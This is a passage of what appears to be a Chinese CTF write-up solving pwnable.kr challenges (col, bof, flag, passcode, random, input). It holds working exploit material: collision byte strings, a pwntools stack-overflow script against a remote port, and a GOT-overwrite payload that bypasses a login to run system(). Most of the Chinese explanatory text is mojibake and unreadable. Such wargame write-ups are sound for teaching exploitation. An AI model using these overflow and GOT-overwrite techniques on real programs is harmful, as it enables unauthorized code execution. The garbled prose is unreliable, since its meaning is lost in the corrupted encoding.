Â≠óËäÇ</li><li>Â∞Ü‰º†ÂÖ•ÁöÑÂÜÖÂÆπÂàÜ‰∏∫ 5 ‰∏™ int ÂÄº</li><li>sum ‰πãÂíåÈúÄ‰∏∫ hashcode</li></ol><p>0x21DD09EC == 568134124 == 113626824*4 + 113626828</p><h3 id="Ëß£È¢ò-1"><a href="#Ëß£È¢ò-1" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `echo -e "\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06"`daddy! I just managed to create a hash collision :)</code></pre><p>ÊàñËÄÖ</p><pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `printf "\xc8\xce\xc5\x06%0.s" {1..4} && printf "\xcc\xce\xc5\x06"`daddy! I just managed to create a hash collision :)</code></pre><p><a href="https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times" target="_blank" rel="noopener">https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times</a></p><h2 id="3-bof"><a href="#3-bof" class="headerlink" title="3. bof"></a>3. bof</h2><h3 id="È¢òÁõÆ-2"><a href="#È¢òÁõÆ-2" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> overflowme<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"overflow me : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>overflowme<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// smash me!</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nah..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">func</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-2"><a href="#ÂàÜÊûê-2" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Âú® Ninja ‰∏≠ÔºåÂèØ‰ª•Êñπ‰æøÁúãÂà∞ÈÄªËæëÂà§Êñ≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907181567512.jpg" alt="-w815"></p><p>Êàë‰ª¨Êù•Áúã‰∏ãCËØ≠Ë®ÄÂáΩÊï∞Ë∞ÉÁî®Ê†àÁöÑÂÖ∏ÂûãÂÜÖÂ≠òÂ∏ÉÂ±Ä</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907189598255.jpg" alt></p><p>Âõ†‰∏∫Â≠òÂÇ®ÂèòÈáèÊó∂ÊòØ‰ªé‰ΩéÂú∞ÂùÄÂºÄÂßãË¶ÜÁõñÁöÑÔºåÊâÄ‰ª•‰ªé ebp-0x2c Âà∞ ebp+0x8ÔºåÊàë‰ª¨ÈúÄË¶ÅË¶ÜÁõñÈïøÂ∫¶ 0x34 ÁöÑÊï∞ÊçÆÔºåÁÑ∂ÂêéË¶ÜÁõñÂèòÈáèÂÄº‰∏∫0xcafebabe</p><h3 id="Ëß£È¢ò-2"><a href="#Ëß£È¢ò-2" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9000</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">"A"</span><span class="token operator">*</span><span class="token number">52</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4. flag"></a>4. flag</h2><h3 id="È¢òÁõÆ-3"><a href="#È¢òÁõÆ-3" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-plain"><code class="language-plain">Papa brought me a packed present! let's open it.Download : http://pwnable.kr/bin/flagThis is reversing task. all you need is binary</code></pre><h3 id="ÂàÜÊûê-3"><a href="#ÂàÜÊûê-3" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>È¶ñÂÖàÊãøÂà∞È¢òÁõÆÔºåÁõ¥Êé•ÊãñËøõ Ninja ÂèØ‰ª•ÂèëËßâÊòØÂä†‰∫ÜÂ£≥ÁöÑÔºåÁÆÄÂçïËØÜÂà´‰∏ãÂèØ‰ª•ÁúãÂà∞ÊòØ upx Â£≥</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907233766982.jpg" alt="-w411"></p><p>Âà©Áî®<code>upx -d</code>ËÑ±Â£≥</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/Ê°åÈù¢$ '/home/pwn/tools/upx-3.96-amd64_linux/upx' -d flag                        Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2020UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------    883745 <-    335288   37.94%   linux/amd64   flagUnpacked 1 file.</code></pre><p>Êü•Áúã‰∏ã main ÂáΩÊï∞ÔºåÊ≥®ÊÑèÂà∞Â≠óÁ¨¶‰∏≤Â≠òÂÇ®ÁöÑ‰ΩçÁΩÆ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907236039631.jpg" alt="-w452"></p><p>ÁÇπËøõÂéªÁúã‰∏ãÔºåÂèØ‰ª•ÁúãÂà∞‰∏äÈù¢ÁöÑÈÇ£‰∏≤Â∫îËØ•Â∞±ÊòØ flag ‰∫Ü</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907235836712.jpg" alt="-w994"></p><h3 id="Ëß£È¢ò-3"><a href="#Ëß£È¢ò-3" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/Ê°åÈù¢$ strings flag | grep ':)'UPX...? sounds like a delivery service :)</code></pre><h2 id="5-passcode"><a href="#5-passcode" class="headerlink" title="5. passcode"></a>5. passcode</h2><h3 id="È¢òÁõÆ-4"><a href="#È¢òÁõÆ-4" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> passcode1<span class="token punctuation">;</span>    <span class="token keyword">int</span> passcode2<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode1 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode2 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checking...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>passcode1<span class="token operator">==</span><span class="token number">338150</span> <span class="token operator">&amp;&amp;</span> passcode2<span class="token operator">==</span><span class="token number">13371337</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login OK!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login Failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter you name : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%100s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome %s!\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Toddler's Secure Login System 1.0 beta.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// something after login...</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now I can safely trust you that you have credential :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-4"><a href="#ÂàÜÊûê-4" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Âà©Áî® scp ÊääÈ¢òÁõÆÊã∑‰∏ãÊù•</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/tools/die_lin64_portable$ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode ./passcode@pwnable.kr's password: passcode                                          100% 7485     7.3KB/s   00:01</code></pre><p>ÂÜçÊù•Ê£ÄÊµã‰∏ãÁ®ãÂ∫èÂºÄÂêØ‰∫ÜÂì™‰∫õ‰øùÊä§Êé™ÊñΩÔºåÊ≥®ÊÑèÂà∞ PIE Ê≤°ÊúâÂºÄÂêØ</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/Ê°åÈù¢$ checksec passcode [*] '/home/pwn/Ê°åÈù¢/passcode'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>ÂõûÂà∞‰ª£Á†ÅÔºåÊ≥®ÊÑèÂà∞<code>scanf(&quot;%d&quot;, passcode1);</code>ËøôÊÆµ‰ª£Á†ÅÊòØÊúâÈóÆÈ¢òÁöÑÔºåÈ¶ñÂÖàËÄÉËôëÁõ¥Êé•Ê∫¢Âá∫Ë¶ÜÁõñpasscode1 ‰ª•Âèä passcode2Ôºå338150 == 0x000528e6Â∑≤ÁªèÂá∫Áé∞‰∫Ü0x00Êà™Êñ≠ÔºåÂõ†Ê≠§Êó†Ê≥ïÂÆûÁé∞ÂèòÈáèË¶ÜÁõñ</p><p>ÈÇ£‰πàÁõ¥Êé•Ë¶ÜÁõñRETÂë¢ÔºüÊ≥®ÊÑèÂà∞ÂºÄÂêØ‰∫Ü CanaryÔºåÈúÄË¶ÅÁªïËøáÔºåÊöÇÊó∂‰∏ç‰ºö:(</p><p>‰ΩÜÊòØÊ≥®ÊÑèÂà∞ PIE Ê≤°ÊúâÂºÄÂêØÔºåËÄå‰∏îpasscode1ÂâçÈù¢Ê≤°ÊúâÂèñÂú∞ÂùÄÁ¨¶Âè∑<code>&amp;</code>ÔºåÊàë‰ª¨ÂèØ‰ª•Ë¶ÜÁõñÂÜÖÂ≠òÂú∞ÂùÄ‰∏∫passcode1ÁöÑÊï∞ÊçÆÂÜÖÂÆπ</p><p>ËøôÊ†∑Êàë‰ª¨ÈÄöËøáÂ∞Ü passcode1 ËÆæÁΩÆ‰∏∫ fflush ÁöÑ GOT Ë°®ÂçïÔºåÈÄöËøá scanf Â∞ÜË∞ÉÁî®Âú∞ÂùÄÊåáÂêë <code>system(&quot;/bin/cat flag&quot;);</code> ËææÊàêÁªïËøáËÆ§ËØÅËé∑Âèñ flagÔºåÂ§ßËá¥Ê≠•È™§Â¶Ç‰∏ãÔºö</p><ol><li><p>‰ªé name Âà∞ passcode1 ÁöÑÈïøÂ∫¶‰∏∫ (ebp+0x70) - (ebp-0x10) = 0x80 == 96</p></li><li><p>Áúã‰∏Ä‰∏ã fflush ÁöÑ GOT Âú∞ÂùÄ‰∏∫0x0804a004</p><pre class=" language-shell"><code class="language-shell"> pwn@pwn-Parallels-Virtual-Platform:~/Ê°åÈù¢$ objdump -R passcode  passcodeÔºö     Êñá‰ª∂Ê†ºÂºè elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET   TYPE              VALUE  08049ff0 R_386_GLOB_DAT    __gmon_start__ 0804a02c R_386_COPY        stdin@@GLIBC_2.0 0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0 0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0 0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4 0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0 0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0 0804a014 R_386_JUMP_SLOT   __gmon_start__ 0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0 0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0 0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</code></pre></li><li><p>ÂÜçÈÄöËøá gdb Êü•Áúã <code>system(&quot;/bin/cat flag&quot;);</code> ÂºÄÂßãË∞ÉÁî®ÁöÑÊåá‰ª§Âú∞ÂùÄ‰∏∫ 0x080485e3ÔºåÂêåÊó∂Ê≥®ÊÑèÂà∞scanf ‰º†ÂèÇÊó∂‰∏∫<code>%d</code>ÔºåÊâÄ‰ª•ÈúÄË¶ÅËΩ¨Êç¢Êàê int ÂûãÊï∞ÊçÆ</p><pre class=" language-armasm"><code class="language-armasm"> (gdb) disassemble login Dump of assembler code for function login:    0x08048564 <+0>:     push   %ebp    0x08048565 <+1>:     mov    %esp,%ebp    0x08048567 <+3>:     sub    $0x28,%esp    0x0804856a <+6>:     mov    $0x8048770,%eax    0x0804856f <+11>:    mov    %eax,(%esp)    0x08048572 <+14>:    call   0x8048420 <printf@plt>    0x08048577 <+19>:    mov    $0x8048783,%eax    0x0804857c <+24>:    mov    -0x10(%ebp),%edx    0x0804857f <+27>:    mov    %edx,0x4(%esp)    0x08048583 <+31>:    mov    %eax,(%esp)    0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>    0x0804858b <+39>:    mov    0x804a02c,%eax    0x08048590 <+44>:    mov    %eax,(%esp)    0x08048593 <+47>:    call   0x8048430 <fflush@plt>    0x08048598 <+52>:    mov    $0x8048786,%eax    0x0804859d <+57>:    mov    %eax,(%esp)    .    .    .    0x080485d7 <+115>:   movl   $0x80487a5,(%esp)    0x080485de <+122>:   call   0x8048450 <puts@plt>    0x080485e3 <+127>:   movl   $0x80487af,(%esp)    0x080485ea <+134>:   call   0x8048460 <system@plt>    0x080485ef <+139>:   leave      0x080485f0 <+140>:   ret        0x080485f1 <+141>:   movl   $0x80487bd,(%esp)    0x080485f8 <+148>:   call   0x8048450 <puts@plt>    0x080485fd <+153>:   movl   $0x0,(%esp)    0x08048604 <+160>:   call   0x8048480 <exit@plt> End of assembler dump.</code></pre></li></ol><h3 id="Ëß£È¢ò-4"><a href="#Ëß£È¢ò-4" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">passcode@pwnable:~$ python -c "print 'A' * 96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcodeToddler's Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩ!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :)</code></pre><h2 id="6-random"><a href="#6-random" class="headerlink" title="6. random"></a>6. random</h2><h3 id="È¢òÁõÆ-5"><a href="#È¢òÁõÆ-5" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> random<span class="token punctuation">;</span>    random <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// random value!</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>key <span class="token operator">^</span> random<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xdeadbeef</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong, maybe you should try 2^32 cases.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-5"><a href="#ÂàÜÊûê-5" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Âõ†‰∏∫Áõ¥Êé• random ‰∏∫‰º™ÈöèÊú∫ÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÁü•ÈÅìÁ®ãÂ∫è‰∏≠ÁîüÊàêÁöÑÂÄºÊòØÂ§öÂ∞ëÂ∞±ÂèØ‰ª•Áõ¥Êé•ÊãøÊù•Âà©Áî®‰∫Ü</p><pre class=" language-armasm"><code class="language-armasm">pwndbg> disassemble mainDump of assembler code for function main:   0x00000000004005f4 <+0>:   push   rbp   0x00000000004005f5 <+1>:   mov    rbp,rsp   0x00000000004005f8 <+4>:   sub    rsp,0x10   0x00000000004005fc <+8>:   mov    eax,0x0   0x0000000000400601 <+13>:  call   0x400500 <rand@plt>   0x0000000000400606 <+18>:  mov    DWORD PTR [rbp-0x4],eax   0x0000000000400609 <+21>:  mov    DWORD PTR [rbp-0x8],0x0   0x0000000000400610 <+28>:  mov    eax,0x400760   0x0000000000400615 <+33>:  lea    rdx,[rbp-0x8]   0x0000000000400619 <+37>:  mov    rsi,rdx   0x000000000040061c <+40>:  mov    rdi,rax   0x000000000040061f <+43>:  mov    eax,0x0   0x0000000000400624 <+48>:  call   0x4004f0 <__isoc99_scanf@plt>   0x0000000000400629 <+53>:  mov    eax,DWORD PTR [rbp-0x8]   0x000000000040062c <+56>:  xor    eax,DWORD PTR [rbp-0x4]   0x000000000040062f <+59>:  cmp    eax,0xdeadbeef   0x0000000000400634 <+64>:  jne    0x400656 <main+98>   0x0000000000400636 <+66>:  mov    edi,0x400763   0x000000000040063b <+71>:  call   0x4004c0 <puts@plt>   0x0000000000400640 <+76>:  mov    edi,0x400769   0x0000000000400645 <+81>:  mov    eax,0x0   0x000000000040064a <+86>:  call   0x4004d0 <system@plt>   0x000000000040064f <+91>:  mov    eax,0x0   0x0000000000400654 <+96>:  jmp    0x400665 <main+113>   0x0000000000400656 <+98>:  mov    edi,0x400778   0x000000000040065b <+103>: call   0x4004c0 <puts@plt>   0x0000000000400660 <+108>: mov    eax,0x0   0x0000000000400665 <+113>: leave     0x0000000000400666 <+114>: ret    End of assembler dump.</code></pre><p>ÂèØ‰ª•Á°ÆËÆ§ random Â≠òÂú® rbp-0x4ÔºåËæìÂÖ•ÂÄºÂ≠òÂú® rbp-0x8</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15909964922295.jpg" alt></p><p>Ê≥®ÊÑèÂ∞èÁ´ØÂ≠òÂÇ®ÔºåÊâÄ‰ª• random=0x6b8b4567</p><p>ËæìÂÖ•ÂÄºÔºö0x6b8b4567 ^ 0xdeadbeef = 3039230856</p><h3 id="Ëß£È¢ò-5"><a href="#Ëß£È¢ò-5" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">random@pwnable:~$ ./random3039230856Good!Mommy, I thought libc random is unpredictable...</code></pre><h2 id="7-input"><a href="#7-input" class="headerlink" title="7. input"></a>7. input</h2><h3 id="È¢òÁõÆ-6"><a href="#È¢òÁõÆ-6" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to pwnable.kr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's see if you know how to give input to program\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Just give me correct inputs then you will get the flag :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// argv</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x20\x0a\x0d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 1 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// stdio</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 2 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// env</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 3 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// file</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fread</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token 